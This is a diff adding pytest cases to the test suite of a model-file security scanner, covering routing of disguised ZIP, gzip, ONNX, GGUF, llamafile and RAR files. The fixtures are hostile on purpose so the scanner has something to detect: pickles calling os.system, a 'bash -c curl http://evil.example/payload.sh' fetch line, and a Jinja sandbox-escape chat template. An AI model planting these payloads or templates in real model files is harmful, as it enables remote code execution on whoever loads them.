@@ -7,15 +7,18 @@ import gzip
 import json
 import pickle
 import zipfile
+from collections.abc import Iterator
 from pathlib import Path
 from typing import Any
 
 import pytest
 
 from modelaudit import core as core_module
-from modelaudit.core import scan_file
-from modelaudit.scanners.base import IssueSeverity, ScanResult
-from tests.helpers import create_mock_gguf, create_mock_pytorch_zip
+from modelaudit.cache import get_cache_manager, reset_cache_manager
+from modelaudit.core import scan_file, scan_model_directory_or_file
+from modelaudit.scanners import flax_msgpack_scanner, jinja2_template_scanner
+from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
+from tests.helpers import create_mock_gguf, create_mock_onnx, create_mock_pytorch_zip
 
 _SYSTEM_GLOBAL_NAMES = ("os.system", "posix.system", "nt.system")
 
@@ -46,6 +49,11 @@ def _create_zip_with_ordered_entries(path: Path, entries: list[tuple[str, bytes]
     with zipfile.ZipFile(path, "w") as archive:
         for name, data in entries:
             archive.writestr(name, data)
+
+
+def _prepend_stub(path: Path, stub: bytes) -> None:
+    """Prefix an existing ZIP with reader-tolerated self-extracting stub bytes."""
+    path.write_bytes(stub + path.read_bytes())
 
 
 def _mark_zip_entries_encrypted(path: Path) -> None:
@@ -83,6 +91,167 @@ def test_scan_file_detects_malicious_zip_with_misleading_extension(tmp_path: Pat
     _assert_system_pickle_detected(result, "payload.pkl")
 
 
+@pytest.mark.parametrize("suffix", [".flax", ".orbax", ".jax"])
+def test_scan_file_fails_closed_for_msgpack_extensions_when_dependency_is_missing(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    suffix: str,
+) -> None:
+    checkpoint = tmp_path / f"model{suffix}"
+    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
+    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)
+
+    result = scan_file(str(checkpoint))
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    library_check = next(check for check in result.checks if check.name == "msgpack Library Check")
+    assert library_check.message == "msgpack library not installed - cannot analyze Flax checkpoints"
+
+    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)
+    assert aggregate.success is True
+    assert core_module.determine_exit_code(aggregate) == 1
+
+
+def test_scan_file_does_not_route_msgpack_suffix_near_match_without_dependency(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    checkpoint = tmp_path / "model.flaxy"
+    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
+    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.success is True
+
+
+def test_scan_file_routes_malicious_explicit_flax_suffix_to_flax_scanner(tmp_path: Path) -> None:
+    if not flax_msgpack_scanner.HAS_MSGPACK:
+        pytest.skip("msgpack unavailable")
+
+    checkpoint = tmp_path / "malicious.flax"
+    checkpoint.write_bytes(
+        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
+    )
+
+    result = scan_file(str(checkpoint), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "flax_msgpack"
+    assert result.success is False
+    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)
+
+
+def test_scan_file_missing_msgpack_result_is_not_cached(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    checkpoint = tmp_path / "model.flax"
+    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)
+
+    reset_cache_manager()
+    try:
+        first = scan_file(str(checkpoint), config=config)
+        second = scan_file(str(checkpoint), config=config)
+
+        assert first.success is False
+        assert second.success is False
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_file_missing_yaml_parser_result_is_not_cached(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    model_dir = tmp_path / "model"
+    model_dir.mkdir()
+    yaml_file = model_dir / "config.yaml"
+    yaml_file.write_text("model: safe\n", encoding="utf-8")
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+    monkeypatch.setattr(jinja2_template_scanner, "HAS_YAML", False)
+
+    reset_cache_manager()
+    try:
+        first = scan_file(str(yaml_file), config=config)
+        second = scan_file(str(yaml_file), config=config)
+
+        assert first.scanner_name == "jinja2_template"
+        assert first.success is False
+        assert second.success is False
+        assert first.metadata["scan_outcome"] == "inconclusive"
+        assert second.metadata["scan_outcome"] == "inconclusive"
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_file_still_routes_malicious_zip_with_local_header(tmp_path: Path) -> None:
+    disguised_zip = tmp_path / "payload.bin"
+    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})
+
+    assert disguised_zip.read_bytes().startswith(b"PK\x03\x04")
+
+    result = scan_file(str(disguised_zip))
+
+    assert result.scanner_name == "zip"
+    _assert_system_pickle_detected(result, "payload.pkl")
+
+
+def test_scan_directory_preserves_parseable_prefixed_zip_with_central_directory_stub(tmp_path: Path) -> None:
+    disguised_zip = tmp_path / "payload.jpg"
+    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})
+    _prepend_stub(disguised_zip, b"PK\x01\x02stub-prefix")
+
+    result = scan_model_directory_or_file(str(tmp_path))
+
+    assert any(scanner_name == "zip" for scanner_name in result.scanner_names)
+    assert any(
+        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
+        for issue in result.issues
+    )
+
+
+def test_scan_model_omits_phase_timings_by_default(tmp_path: Path) -> None:
+    payload = tmp_path / "payload.pkl"
+    payload.write_bytes(pickle.dumps({"weights": [1, 2, 3]}))
+
+    result = scan_model_directory_or_file(str(payload), cache_scan_results=False)
+
+    assert not hasattr(result, "phase_timings")
+
+
+def test_scan_model_emits_opt_in_phase_timings(tmp_path: Path) -> None:
+    payload = tmp_path / "payload.pkl"
+    payload.write_bytes(pickle.dumps({"weights": [1, 2, 3]}))
+
+    result = scan_model_directory_or_file(str(payload), cache_scan_results=False, profile_timings=True)
+    phase_timings = result.phase_timings  # type: ignore[attr-defined]
+
+    assert phase_timings.keys() >= {
+        "scanner_selection",
+        "top_level_hashing",
+        "file_scan_dispatch",
+        "result_merge",
+        "license_metadata",
+        "result_consolidation",
+        "commercial_use_warnings",
+        "aggregate_hash",
+    }
+    assert all(duration >= 0 for duration in phase_timings.values())
+
+
 def test_scan_file_detects_misnamed_gzip_wrapped_pickle_by_header(tmp_path: Path) -> None:
     disguised_gzip = tmp_path / "payload.jpg"
     disguised_gzip.write_bytes(gzip.compress(_build_malicious_pickle()))
@@ -101,6 +270,25 @@ def test_scan_file_detects_misnamed_gzip_wrapped_pickle_by_header(tmp_path: Path
     ), f"Expected compressed inner pickle finding, got: {[(i.location, i.message, i.details) for i in result.issues]}"
 
 
+def test_scan_file_detects_late_pickle_in_misnamed_concatenated_gzip(tmp_path: Path) -> None:
+    disguised_gzip = tmp_path / "payload.jpg"
+    disguised_gzip.write_bytes(gzip.compress(b"harmless prelude\n") + gzip.compress(_build_malicious_pickle()))
+
+    result = scan_file(str(disguised_gzip))
+
+    assert result.scanner_name == "compressed"
+    assert result.metadata["compressed_member_count"] == 2
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("compressed_wrapper") == f"{disguised_gzip} -> payload.jpg.inner#member-2"
+        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
+        for issue in result.issues
+    ), (
+        "Expected late compressed-member pickle finding, got: "
+        f"{[(i.location, i.message, i.details) for i in result.issues]}"
+    )
+
+
 def test_scan_file_does_not_route_compression_magic_near_match_to_compressed(tmp_path: Path) -> None:
     near_match = tmp_path / "payload.jpg"
     near_match.write_bytes(b"\x1f\x00not-a-gzip-stream")
@@ -109,6 +297,17 @@ def test_scan_file_does_not_route_compression_magic_near_match_to_compressed(tmp
 
     assert result.scanner_name == "unknown"
     assert not [check for check in result.checks if check.name.startswith("Compressed Wrapper")]
+    assert result.issues == []
+
+
+def test_scan_file_does_not_route_pk_prefix_near_match_to_zip(tmp_path: Path) -> None:
+    near_match = tmp_path / "payload.jpg"
+    near_match.write_bytes(b"PKNO harmless text")
+
+    result = scan_file(str(near_match))
+
+    assert result.scanner_name == "unknown"
+    assert not [check for check in result.checks if "ZIP" in check.name]
     assert result.issues == []
 
 
@@ -533,6 +732,63 @@ def test_scan_file_routes_misnamed_pytorch_zip_by_content(tmp_path: Path) -> Non
     assert any("data.pkl" in (issue.location or "") for issue in result.issues)
 
 
+@pytest.mark.parametrize(
+    ("pickle_member", "storage_member"),
+    [("data.pkl", "data/0"), ("archive/data.pkl", "archive/data/0")],
+)
+def test_scan_file_routes_misnamed_pytorch_zip_with_storage_but_no_metadata(
+    tmp_path: Path,
+    pickle_member: str,
+    storage_member: str,
+) -> None:
+    disguised_torch = tmp_path / f"metadata-stripped-{pickle_member.replace('/', '-')}.jpg"
+    _create_misnamed_zip(
+        disguised_torch,
+        {
+            pickle_member: _build_malicious_pickle(),
+            storage_member: b"tensor-storage",
+        },
+    )
+
+    result = scan_file(str(disguised_torch))
+
+    assert result.scanner_name == "pytorch_zip"
+    assert any(pickle_member in (issue.location or "") for issue in result.issues)
+
+
+@pytest.mark.parametrize(
+    ("pickle_member", "near_storage_member"),
+    [
+        ("data.pkl", "data/readme.txt"),
+        ("data.pkl", "data/0abc"),
+        ("data.pkl", "data/weights.v2"),
+        ("data.pkl", "data/0/readme.txt"),
+        ("archive/data.pkl", "archive/data/readme.txt"),
+        ("archive/data.pkl", "archive/data/0abc"),
+        ("archive/data.pkl", "archive/data/weights.v2"),
+        ("archive/data.pkl", "archive/data/0/readme.txt"),
+    ],
+)
+def test_scan_file_does_not_route_generic_data_directory_to_pytorch_zip(
+    tmp_path: Path,
+    pickle_member: str,
+    near_storage_member: str,
+) -> None:
+    disguised_zip = tmp_path / f"generic-data-dir-{pickle_member.replace('/', '-')}.jpg"
+    _create_misnamed_zip(
+        disguised_zip,
+        {
+            pickle_member: _build_malicious_pickle(),
+            near_storage_member: b"not tensor storage",
+        },
+    )
+
+    result = scan_file(str(disguised_zip))
+
+    assert result.scanner_name == "zip"
+    _assert_system_pickle_detected(result, pickle_member)
+
+
 @pytest.mark.parametrize("suffix", [".pt", ".pth", ".ckpt", ".bin", ".pkl"])
 def test_scan_file_routes_zip_backed_torch_suffix_collisions_to_pytorch_zip(
     tmp_path: Path,
@@ -559,6 +815,28 @@ def test_scan_file_routes_raw_pickle_torch_suffix_collisions_to_pickle(
 
     assert result.scanner_name == "pickle"
     assert result.success is True
+
+
+def test_scan_file_routes_jax_pickles_through_jax_specific_analysis(tmp_path: Path) -> None:
+    model_path = tmp_path / "state.pickle"
+    model_path.write_bytes(
+        pickle.dumps(
+            {
+                "framework": "jax",
+                "payload": "jax.experimental.io_callback",
+            }
+        )
+    )
+
+    result = scan_file(str(model_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "pickle"
+    assert any(
+        check.name == "JAX Pattern Security Check"
+        and check.status == CheckStatus.FAILED
+        and check.details["pattern"] == r"jax\.experimental\.io_callback"
+        for check in result.checks
+    )
 
 
 def test_scan_file_routes_raw_bin_without_zip_structure_to_pytorch_binary(tmp_path: Path) -> None:
@@ -689,6 +967,21 @@ def test_scan_file_routes_misnamed_gguf_by_header(tmp_path: Path) -> None:
     assert result.metadata["format"] == "gguf"
 
 
+def test_scan_file_routes_gguf_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
+    gguf_path = create_mock_gguf(
+        tmp_path / "model.gguf",
+        metadata={"tokenizer.chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"},
+    )
+
+    result = scan_file(str(gguf_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "gguf"
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
 def test_scan_file_does_not_route_gguf_magic_near_match_to_gguf(tmp_path: Path) -> None:
     near_match = tmp_path / "model.payload"
     near_match.write_bytes(b"GGU?" + b"\x00" * 32)
@@ -699,13 +992,277 @@ def test_scan_file_does_not_route_gguf_magic_near_match_to_gguf(tmp_path: Path) 
     assert result.issues == []
 
 
+def test_scan_file_routes_extensionless_llamafile(tmp_path: Path) -> None:
+    extensionless_llamafile = tmp_path / "llama"
+    extensionless_llamafile.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")
+
+    result = scan_file(str(extensionless_llamafile))
+
+    assert result.scanner_name == "llamafile"
+
+
+def test_scan_file_routes_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
+    extensionless_llamafile = tmp_path / "llama"
+    extensionless_llamafile.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"A" * (2 * 1024 * 1024 + 64)
+        + b"llamafile runtime"
+        + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    result = scan_file(str(extensionless_llamafile))
+
+    assert result.scanner_name == "llamafile"
+
+
+def test_scan_file_detects_malicious_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
+    extensionless_llamafile = tmp_path / "llama"
+    extensionless_llamafile.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"A" * (2 * 1024 * 1024 + 64)
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+        + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    result = scan_file(str(extensionless_llamafile))
+
+    assert result.scanner_name == "llamafile"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_detects_malicious_extensionless_llamafile(tmp_path: Path) -> None:
+    extensionless_llamafile = tmp_path / "llama"
+    extensionless_llamafile.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    result = scan_file(str(extensionless_llamafile))
+
+    assert result.scanner_name == "llamafile"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_file_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
+    generic_executable = tmp_path / "tool"
+    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+    result = scan_file(str(generic_executable))
+
+    assert result.scanner_name == "unknown"
+    assert result.issues == []
+
+
+def test_scan_file_routes_middle_marker_llamafile_exe(tmp_path: Path) -> None:
+    middle_marker = tmp_path / "middle-marker.exe"
+    middle_marker.write_bytes(
+        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llamafile runtime" + b"B" * (2 * 1024 * 1024 + 64)
+    )
+
+    result = scan_file(str(middle_marker))
+
+    assert result.scanner_name == "llamafile"
+
+
+def test_scan_file_routes_tail_marker_llamafile_exe(tmp_path: Path) -> None:
+    tail_marker = tmp_path / "tail-marker.exe"
+    tail_marker.write_bytes(b"MZ" + b"\x00" * 62 + b"A" * ((8 * 1024 * 1024) + 64) + b"llamafile runtime")
+
+    result = scan_file(str(tail_marker))
+
+    assert result.scanner_name == "llamafile"
+
+
 def test_scan_file_routes_misnamed_onnx_by_header(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
     disguised_onnx = tmp_path / "model.payload"
-    disguised_onnx.write_bytes(b"\x08\x01\x12\x00onnx.proto" + b"\x00" * 32)
+    create_mock_onnx(disguised_onnx)
 
     result = scan_file(str(disguised_onnx))
 
     assert result.scanner_name == "onnx"
+
+
+def test_scan_file_routes_onnx_pb_by_content(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    onnx_pb = tmp_path / "model.pb"
+    create_mock_onnx(onnx_pb)
+
+    result = scan_file(str(onnx_pb))
+
+    assert result.scanner_name == "onnx"
+    assert not any(check.name == "Format Validation" for check in result.checks)
+
+
+def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    onnx_pb = tmp_path / "malicious.pb"
+    create_mock_onnx(onnx_pb, op_type="PythonOp")
+
+    result = scan_file(str(onnx_pb))
+
+    assert result.scanner_name == "onnx"
+    assert not any(check.name == "Format Validation" for check in result.checks)
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
+        for issue in result.issues
+    )
+
+
+def test_scan_file_does_not_route_incidental_onnx_pb_string(tmp_path: Path) -> None:
+    near_match = tmp_path / "metadata.pb"
+    near_match.write_bytes(bytes([0x0A, 0x04]) + b"onnx" + b"\x00" * 16)
+
+    result = scan_file(str(near_match))
+
+    assert result.scanner_name != "onnx"
+    assert not any(check.name == "Python Operator Detection" for check in result.checks)
+
+
+def test_scan_file_fails_closed_when_recognized_format_scanner_is_unavailable(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    unavailable_onnx = tmp_path / "model.onnx"
+    unavailable_onnx.write_bytes(b"recognized-format")
+
+    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "onnx")
+    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "onnx")
+    monkeypatch.setattr(core_module, "detect_format_from_extension", lambda _path: "onnx")
+    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
+    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)
+
+    result = scan_file(str(unavailable_onnx))
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.has_errors is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert result.metadata["analysis_incomplete"] is True
+    assert result.metadata["operational_error"] is True
+    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
+    assert "recognized_format_scanner_unavailable" in result.metadata["scan_outcome_reasons"]
+
+    check = next(check for check in result.checks if check.name == "Format Detection")
+    assert check.severity == IssueSeverity.INFO
+    assert "Recognized format could not be scanned" in check.message
+    assert check.details["format"] == "onnx"
+    assert check.details["preferred_scanner_id"] == "onnx"
+
+    aggregate = core_module.scan_model_directory_or_file(str(unavailable_onnx))
+    assert aggregate.success is False
+    assert core_module.determine_exit_code(aggregate) == 2
+
+
+def test_scan_file_does_not_fail_closed_for_extension_only_recognized_format(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    generic_pb = tmp_path / "metadata.pb"
+    generic_pb.write_bytes(b"plain protobuf-ish bytes")
+
+    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
+    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)
+
+    result = scan_file(str(generic_pb))
+
+    assert result.scanner_name == "unknown"
+    assert result.success is True
+    assert result.metadata.get("scan_outcome") != "inconclusive"
+    assert not any(check.name == "Format Detection" for check in result.checks)
+
+
+def test_scan_file_unavailable_recognized_format_result_is_not_cached(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    unavailable_onnx = tmp_path / "model.onnx"
+    unavailable_onnx.write_bytes(b"recognized-format")
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "onnx")
+    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "onnx")
+    monkeypatch.setattr(core_module, "detect_format_from_extension", lambda _path: "onnx")
+    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
+    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)
+
+    reset_cache_manager()
+    try:
+        first = scan_file(str(unavailable_onnx), config=config)
+        second = scan_file(str(unavailable_onnx), config=config)
+
+        assert first.success is False
+        assert second.success is False
+        assert first.metadata["scan_outcome"] == "inconclusive"
+        assert second.metadata["scan_outcome"] == "inconclusive"
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp_path: Path) -> None:
+    ambiguous_xml = tmp_path / "payload.txt"
+    ambiguous_xml.write_text(
+        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
+        encoding="utf-8",
+    )
+
+    result = scan_file(str(ambiguous_xml), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert result.metadata["operational_error_reason"] == "xml_model_routing_incomplete"
+    check = next(check for check in result.checks if check.name == "XML Model Routing")
+    assert "bounded probe ended before the first structural root element" in check.message
+
+
+def test_scan_file_incomplete_xml_routing_result_is_not_cached(tmp_path: Path) -> None:
+    ambiguous_xml = tmp_path / "payload.txt"
+    ambiguous_xml.write_text(
+        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
+        encoding="utf-8",
+    )
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    reset_cache_manager()
+    try:
+        first = scan_file(str(ambiguous_xml), config=config)
+        second = scan_file(str(ambiguous_xml), config=config)
+
+        assert first.success is False
+        assert second.success is False
+        assert first.metadata["scan_outcome"] == "inconclusive"
+        assert second.metadata["scan_outcome"] == "inconclusive"
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_file_ignores_benign_onnx_token_near_match(tmp_path: Path) -> None:
+    near_match = tmp_path / "note.payload"
+    near_match.write_bytes(b"this documentation mentions onnx but is not a model")
+
+    result = scan_file(str(near_match))
+
+    assert result.scanner_name == "unknown"
+    assert result.issues == []
 
 
 def test_scan_file_routes_misnamed_numpy_by_header(tmp_path: Path) -> None:
@@ -736,6 +1293,56 @@ def test_scan_file_routes_misnamed_sevenzip_by_header(tmp_path: Path) -> None:
     assert any("payload.pkl" in (issue.location or "") for issue in result.issues)
 
 
+def test_scan_file_fails_closed_on_rar_archive(tmp_path: Path) -> None:
+    rar_path = tmp_path / "archive.rar"
+    rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)
+
+    result = scan_file(str(rar_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "rar"
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert "rar_archive_unsupported" in result.metadata["scan_outcome_reasons"]
+    rar_check = next(check for check in result.checks if check.name == "RAR Archive Support")
+    assert rar_check.severity == IssueSeverity.INFO
+    assert "RAR archive contents were not scanned" in rar_check.message
+
+
+def test_scan_file_does_not_fail_closed_on_rar_suffix_near_match(tmp_path: Path) -> None:
+    rar_path = tmp_path / "not_really.rar"
+    rar_path.write_text("plain text, not a RAR archive\n", encoding="utf-8")
+
+    result = scan_file(str(rar_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name != "rar"
+    assert result.metadata.get("scan_outcome") != "inconclusive"
+    assert not any(check.name == "RAR Archive Support" for check in result.checks)
+
+
+def test_scan_file_rar_inconclusive_result_is_not_cached(tmp_path: Path) -> None:
+    rar_path = tmp_path / "archive.rar"
+    rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    reset_cache_manager()
+    try:
+        first = scan_file(str(rar_path), config=config)
+        second = scan_file(str(rar_path), config=config)
+
+        assert first.success is False
+        assert second.success is False
+        assert first.metadata["scan_outcome"] == "inconclusive"
+        assert second.metadata["scan_outcome"] == "inconclusive"
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
 def test_scan_file_routes_readme_documentation_to_metadata_scanner(tmp_path: Path) -> None:
     readme_path = tmp_path / "README.md"
     readme_path.write_text("# Model Card\n\nThis README is benign.\n")
@@ -762,3 +1369,80 @@ def test_scan_file_routes_model_config_json_to_manifest_scanner(tmp_path: Path) 
 
     assert result.scanner_name == "manifest"
     assert result.success is True
+
+
+def test_directory_child_probe_stops_at_limit(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
+    def bounded_iterdir(self: Path) -> Iterator[Path]:
+        for index in range(core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT):
+            yield self / f"child_{index}"
+        raise AssertionError("directory child probe consumed past its limit")
+
+    monkeypatch.setattr(Path, "iterdir", bounded_iterdir)
+
+    assert (
+        core_module._count_immediate_children_up_to(
+            tmp_path,
+            core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT,
+        )
+        == core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT
+    )
+
+
+def test_directory_file_probe_stops_after_limit(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
+    def bounded_rglob(self: Path, pattern: str) -> Iterator[Path]:
+        assert pattern == "*"
+        for index in range(core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT + 1):
+            child = self / f"child_{index}.pkl"
+            child.touch()
+            yield child
+        raise AssertionError("directory file probe consumed past its limit")
+
+    monkeypatch.setattr(Path, "rglob", bounded_rglob)
+
+    assert (
+        core_module._count_files_up_to(
+            tmp_path,
+            core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT,
+        )
+        is None
+    )
+
+
+def test_scan_directory_without_progress_skips_file_counting(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    model_path = tmp_path / "model.pkl"
+    model_path.write_bytes(b"\x80\x04N.")
+
+    def fail_rglob(self: Path, pattern: str) -> Iterator[Path]:
+        raise AssertionError(f"unexpected rglob({pattern!r}) for {self}")
+
+    monkeypatch.setattr(Path, "rglob", fail_rglob)
+
+    result = scan_model_directory_or_file(
+        str(tmp_path),
+        cache_scan_results=False,
+    )
+
+    assert result.files_scanned == 1
+
+
+def test_scan_file_routes_manifest_owned_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
+    manifest_path = tmp_path / "config.json"
+    manifest_path.write_text(
+        json.dumps(
+            {
+                "model_type": "llama",
+                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+            }
+        )
+    )
+
+    result = scan_file(str(manifest_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "manifest"
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
